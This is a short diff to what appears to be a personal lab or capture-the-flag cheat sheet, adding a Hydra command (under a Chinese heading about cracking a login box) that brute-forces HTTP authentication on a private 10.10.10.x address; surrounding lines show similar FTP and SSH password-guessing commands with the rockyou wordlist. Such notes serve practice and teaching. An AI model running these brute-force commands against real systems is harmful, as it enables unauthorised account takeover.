@@ -29,3 +29,9 @@ sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.
 ```
 hydra -l sword -P passwords.txt ssh://10.10.10.5 -t 30 -V
 ```
+
+- 破解登入框
+
+```
+sudo hydra -l shaldon -P password.txt -f 10.10.10.39 -s 80 http-get /the_real_secret_dir
+```
